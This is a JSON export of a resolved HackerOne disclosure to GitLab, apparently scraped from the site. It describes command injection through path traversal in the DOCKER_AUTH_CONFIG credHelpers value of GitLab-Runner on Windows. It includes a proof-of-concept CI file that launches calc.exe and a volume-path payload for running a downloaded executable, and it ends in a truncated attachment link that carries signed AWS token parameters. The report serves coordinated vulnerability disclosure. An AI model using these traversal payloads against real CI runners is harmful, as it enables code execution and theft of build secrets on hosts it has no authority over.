{"id":955016,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTUwMTY=","url":"https://hackerone.com/reports/955016","title":"GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-08-10T15:08:41.978Z","submitted_at":"2020-08-10T15:08:42.114Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ajxchapman","url":"/ajxchapman","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-04T08:35:20.727Z","bug_reporter_agreed_on_going_public_at":"2020-11-04T08:35:20.631Z","team_member_agreed_on_going_public_at":"2020-11-03T22:20:39.528Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nGitLab-Runner, when running on Windows with a `docker` executor, is vulnerable to Command Injection via the `DOCKER_AUTH_CONFIG` build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.\n\n## Details\n\nWhen using a `docker` executor, the `DOCKER_AUTH_CONFIG` build variable is processed as a JSON docker config file. One of the possible config values, `credHelpers`, specifies a hash of repository keys to docker Credential Helper application values. \n\n```json\n{\n  \"credHelpers\" : {\n    \"repo.example.com\" : \"application\"\n  }\n}\n```\n\nWhen `gitlab-runner` attempts to create an image, each key value pair in the `credHelpers` hash is processed, and the corresponding Credential Helper application is executed by `gitlab-runner` in order to obtain credentials for the repository. This execution occurs on the docker container host, `gitlab-runner` directly `exec`s the Credential Helper to receive it's output.\n\nDocker Credential Helpers, as processed by the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` function are prepended with the string `docker-credential-` before execution:\n\n```go\n// github.com/docker/cli/cli/config/credentials/native_store.go\nconst (\n\tremoteCredentialsPrefix = \"docker-credential-\"\n\ttokenUsername           = \"\u003ctoken\u003e\"\n)\n\n...\n\nfunc NewNativeStore(file store, helperSuffix string) Store {\n\tname := remoteCredentialsPrefix + helperSuffix\n\treturn \u0026nativeStore{\n\t\tprogramFunc: client.NewShellProgramFunc(name),\n\t\tfileStore:   NewFileStore(file),\n\t}\n}\n```\n\nThis is sufficient to prevent command injection on *nix based systems, however Windows based systems can exploit path traversal to execute arbitrary programs as Credential Helpers. E.G. a `credHelper` of `{\"helper\" : :/../../../../../../../../Windows/System32/calc.exe\"}` would result in the application `docker-credential-/../../../../../../../../Windows/System32/calc.exe` being executed, which on a Windows system would resolve to `C:/Windows/System32/calc.exe`. This only affects Windows based systems, as Windows does not verify path directories exist during path normalization. In this case, Windows does not check the directory `docker-credential-` exists as it is normalized out due to the path traversal characters following it.\n\nThe Credential Helper execution is ultimately called in the `gitlab-runner` code by `gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go:readConfigsFromCredentialsHelper` calling the `github.com/docker/cli/cli/config/credentials/native_store.go:Get` `docker` API method:\n\n```go\n// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go\nfunc readConfigsFromCredentialsHelper(config *configfile.ConfigFile) (map[string]types.AuthConfig, error) {\n\thelpersAuths := make(map[string]types.AuthConfig)\n\n\tfor registry, helper := range config.CredentialHelpers {\n\t\tstore := credentials.NewNativeStore(config, helper)\n\n\t\tnewAuths, err := store.Get(registry)\n```\n\nThe issue exists as the `gitlab-runner` code does not check for path traversals in Credential Helper values before passing them to the `docker` API.\n\nIn it's simplest form, this issue can be exploited to execute any program that exists on the system running `gitlab-runner` with uncontrolled arguments. However, arbitrary programs can be executed by setting up a `service` which downloads an executable payload to the `C:\\Builds` volume mounted directory, and setting the full path to the volume mounted directory as the `credHelper` value, e.g.:\n```json\n{\n  \"helper\" : \"/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe\"\n}\n```\n\nThis works as the following three conditions are met:\n1. The source of the volume mounted `build` directory is predictable per build\n1. The `DOCKER_AUTH_CONFIG` is processed once for each created container\n1. The build container is created after all `service` containers have been started.\n\n## Steps to reproduce\n\n* Register and run a runner on a Windows system with a docker executor and a tag of `windows-docker-runner`.\n* Create a Build with the following `.gitlab-ci.yml`:\n\n```yml\nservices:\n  - alpasdfasdfasdfasdfasdfidne:3.5\nvariables:\n  DOCKER_AUTH_CONFIG: \"{\\\"credHelpers\\\" : {\\\"repo.example.com\\\" : \\\"/../../../../../../../../Windows/System32/calc.exe\\\"}}\"\n\nbuild1:\n  tags:\n    - windows-docker-runner\n  stage: build\n  script:\n    - whoami\n```\n\nWhen `gitlab-runner` picks up the build it will process the `DOCKER_AUTH_CONFIG` json and launch the CredentialHelper specified, in this case `calc.exe`.\n\nConfirmed vulnerable version configurations are:\n* gitlab-runner 13.2.2 on Windows 10 with Docker Toolbox (`docker` runner)\n* gitlab-runner 13.2.2 on Windows 2019 with Docker Enterprise (`docker-windows` runner)\n\n## Impact\n\nExploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.\n\n## What is the current *bug* behavior?\n\ngitlab-runner passes unsanitized JSON values from the `DOCKER_AUTH_CONFIG` build variable to the `github.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore` `docker` API function, which may result in command injection on Windows systems.\n\n## What is the expected *correct* behavior?\n\nJSON supplied via the `DOCKER_AUTH_CONFIG` build variable should be processed to ensure it does not contain malicious content.\n\n## Relevant logs and/or screenshots\n\n{F943021}\n\n## Output of checks\n\n`gitlab-runner --version`\n```\nVersion:      13.2.2\nGit revision: a998cacd\nGit branch:   refs/pipelines/172580057\nGO version:   go1.13.8\nBuilt:        2020-07-30T14:52:23+0000\nOS/Arch:      windows/amd64\n```\n\n`config.toml`\n```toml\nconcurrent = 1\ncheck_interval = 0\n\n[session_server]\n  session_timeout = 1800\n\n[[runners]]\n  name = \"windows\"\n  url = \"https://gitlab.com\"\n  token = \"█████\"\n  executor = \"docker-windows\"\n  [runners.custom_build_dir]\n  [runners.cache]\n    [runners.cache.s3]\n    [runners.cache.gcs]\n  [runners.docker]\n    tls_verify = false\n    image = \"mcr.microsoft.com/windows/servercore:1809\"\n    privileged = false\n    disable_entrypoint_overwrite = false\n    oom_kill_disable = false\n    disable_cache = false\n    volumes = [\"c:\\\\cache\"]\n    shm_size = 0\n```\n\n## Impact\n\nExploitation of this issue could compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data to a malicious user.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eGitLab-Runner, when running on Windows with a \u003ccode\u003edocker\u003c/code\u003e executor, is vulnerable to Command Injection via the \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e build variable. Injected commands are executed on the container host, not within a Docker container, as such could compromise all future builds which are executed by the runner.\u003c/p\u003e\n\n\u003ch2 id=\"details\"\u003eDetails\u003c/h2\u003e\n\n\u003cp\u003eWhen using a \u003ccode\u003edocker\u003c/code\u003e executor, the \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e build variable is processed as a JSON docker config file. One of the possible config values, \u003ccode\u003ecredHelpers\u003c/code\u003e, specifies a hash of repository keys to docker Credential Helper application values. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;credHelpers\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;repo.example.com\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;application\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen \u003ccode\u003egitlab-runner\u003c/code\u003e attempts to create an image, each key value pair in the \u003ccode\u003ecredHelpers\u003c/code\u003e hash is processed, and the corresponding Credential Helper application is executed by \u003ccode\u003egitlab-runner\u003c/code\u003e in order to obtain credentials for the repository. This execution occurs on the docker container host, \u003ccode\u003egitlab-runner\u003c/code\u003e directly \u003ccode\u003eexec\u003c/code\u003es the Credential Helper to receive it\u0026#39;s output.\u003c/p\u003e\n\n\u003cp\u003eDocker Credential Helpers, as processed by the \u003ccode\u003egithub.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore\u003c/code\u003e function are prepended with the string \u003ccode\u003edocker-credential-\u003c/code\u003e before execution:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight go\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e// github.com/docker/cli/cli/config/credentials/native_store.go\u003c/span\u003e\n\u003cspan class=\"k\"\u003econst\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eremoteCredentialsPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;docker-credential-\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etokenUsername\u003c/span\u003e           \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;token\u0026gt;\u0026quot;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efunc\u003c/span\u003e \u003cspan class=\"n\"\u003eNewNativeStore\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"n\"\u003estore\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehelperSuffix\u003c/span\u003e \u003cspan class=\"kt\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003eStore\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e:=\u003c/span\u003e \u003cspan class=\"n\"\u003eremoteCredentialsPrefix\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ehelperSuffix\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003enativeStore\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eprogramFunc\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eclient\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eNewShellProgramFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n        \u003cspan class=\"n\"\u003efileStore\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e   \u003cspan class=\"n\"\u003eNewFileStore\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis is sufficient to prevent command injection on *nix based systems, however Windows based systems can exploit path traversal to execute arbitrary programs as Credential Helpers. E.G. a \u003ccode\u003ecredHelper\u003c/code\u003e of \u003ccode\u003e{\u0026quot;helper\u0026quot; : :/../../../../../../../../Windows/System32/calc.exe\u0026quot;}\u003c/code\u003e would result in the application \u003ccode\u003edocker-credential-/../../../../../../../../Windows/System32/calc.exe\u003c/code\u003e being executed, which on a Windows system would resolve to \u003ccode\u003eC:/Windows/System32/calc.exe\u003c/code\u003e. This only affects Windows based systems, as Windows does not verify path directories exist during path normalization. In this case, Windows does not check the directory \u003ccode\u003edocker-credential-\u003c/code\u003e exists as it is normalized out due to the path traversal characters following it.\u003c/p\u003e\n\n\u003cp\u003eThe Credential Helper execution is ultimately called in the \u003ccode\u003egitlab-runner\u003c/code\u003e code by \u003ccode\u003egitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go:readConfigsFromCredentialsHelper\u003c/code\u003e calling the \u003ccode\u003egithub.com/docker/cli/cli/config/credentials/native_store.go:Get\u003c/code\u003e \u003ccode\u003edocker\u003c/code\u003e API method:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight go\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e// gitlab.com/gitlab-org/gitlab-runner/helpers/docker/auth/auth.go\u003c/span\u003e\n\u003cspan class=\"k\"\u003efunc\u003c/span\u003e \u003cspan class=\"n\"\u003ereadConfigsFromCredentialsHelper\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003econfigfile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eConfigFile\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"kt\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"n\"\u003etypes\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAuthConfig\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ehelpersAuths\u003c/span\u003e \u003cspan class=\"o\"\u003e:=\u003c/span\u003e \u003cspan class=\"nb\"\u003emake\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"kt\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"n\"\u003etypes\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAuthConfig\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003eregistry\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehelper\u003c/span\u003e \u003cspan class=\"o\"\u003e:=\u003c/span\u003e \u003cspan class=\"k\"\u003erange\u003c/span\u003e \u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eCredentialHelpers\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003estore\u003c/span\u003e \u003cspan class=\"o\"\u003e:=\u003c/span\u003e \u003cspan class=\"n\"\u003ecredentials\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eNewNativeStore\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econfig\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ehelper\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003enewAuths\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eerr\u003c/span\u003e \u003cspan class=\"o\"\u003e:=\u003c/span\u003e \u003cspan class=\"n\"\u003estore\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eGet\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eregistry\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe issue exists as the \u003ccode\u003egitlab-runner\u003c/code\u003e code does not check for path traversals in Credential Helper values before passing them to the \u003ccode\u003edocker\u003c/code\u003e API.\u003c/p\u003e\n\n\u003cp\u003eIn it\u0026#39;s simplest form, this issue can be exploited to execute any program that exists on the system running \u003ccode\u003egitlab-runner\u003c/code\u003e with uncontrolled arguments. However, arbitrary programs can be executed by setting up a \u003ccode\u003eservice\u003c/code\u003e which downloads an executable payload to the \u003ccode\u003eC:\\Builds\u003c/code\u003e volume mounted directory, and setting the full path to the volume mounted directory as the \u003ccode\u003ecredHelper\u003c/code\u003e value, e.g.:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n  \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;helper\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/testfile.exe\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis works as the following three conditions are met:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe source of the volume mounted \u003ccode\u003ebuild\u003c/code\u003e directory is predictable per build\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e is processed once for each created container\u003c/li\u003e\n\u003cli\u003eThe build container is created after all \u003ccode\u003eservice\u003c/code\u003e containers have been started.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eRegister and run a runner on a Windows system with a docker executor and a tag of \u003ccode\u003ewindows-docker-runner\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCreate a Build with the following \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight yaml\"\u003e\u003ccode\u003e\u003cspan class=\"na\"\u003eservices\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003ealpasdfasdfasdfasdfasdfidne:3.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003evariables\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"na\"\u003eDOCKER_AUTH_CONFIG\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003ecredHelpers\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003erepo.example.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"s\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003e \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e/../../../../../../../../Windows/System32/calc.exe\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e}}\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"na\"\u003ebuild1\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n  \u003cspan class=\"na\"\u003etags\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003ewindows-docker-runner\u003c/span\u003e\n  \u003cspan class=\"na\"\u003estage\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ebuild\u003c/span\u003e\n  \u003cspan class=\"na\"\u003escript\u003c/span\u003e\u003cspan class=\"pi\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"pi\"\u003e-\u003c/span\u003e \u003cspan class=\"s\"\u003ewhoami\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen \u003ccode\u003egitlab-runner\u003c/code\u003e picks up the build it will process the \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e json and launch the CredentialHelper specified, in this case \u003ccode\u003ecalc.exe\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eConfirmed vulnerable version configurations are:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003egitlab-runner 13.2.2 on Windows 10 with Docker Toolbox (\u003ccode\u003edocker\u003c/code\u003e runner)\u003c/li\u003e\n\u003cli\u003egitlab-runner 13.2.2 on Windows 2019 with Docker Enterprise (\u003ccode\u003edocker-windows\u003c/code\u003e runner)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eExploitation of this issue could compromise the underlying system on which \u003ccode\u003egitlab-runner\u003c/code\u003e runs, exposing source code, build artifacts and other sensitive data to a malicious user.\u003c/p\u003e\n\n\u003ch2 id=\"what-is-the-current-bug-behavior\"\u003eWhat is the current \u003cem\u003ebug\u003c/em\u003e behavior?\u003c/h2\u003e\n\n\u003cp\u003egitlab-runner passes unsanitized JSON values from the \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e build variable to the \u003ccode\u003egithub.com/docker/cli/cli/config/credentials/native_store.go:NewNativeStore\u003c/code\u003e \u003ccode\u003edocker\u003c/code\u003e API function, which may result in command injection on Windows systems.\u003c/p\u003e\n\n\u003ch2 id=\"what-is-the-expected-correct-behavior\"\u003eWhat is the expected \u003cem\u003ecorrect\u003c/em\u003e behavior?\u003c/h2\u003e\n\n\u003cp\u003eJSON supplied via the \u003ccode\u003eDOCKER_AUTH_CONFIG\u003c/code\u003e build variable should be processed to ensure it does not contain malicious content.\u003c/p\u003e\n\n\u003ch2 id=\"relevant-logs-and-or-screenshots\"\u003eRelevant logs and/or screenshots\u003c/h2\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"gitlab-runner-windows.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WwTP9bAu5UPfzCRXdpps5Tm9?response-content-disposition=attachment%3B%20filename%3D%22gitlab-runner-windows.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab-runner-windows.mp4\u0026amp;response-content-type=video%2Fmp4\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T071430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026amp;X-Amz-Signature=dcc3006a3866b9cd14ec5301ef258bb7f9abb19406dbd2494681117bf19e5950\" data-attachment-type=\"video/mp4\"\u003e\u003cvideo controls=\"controls\" 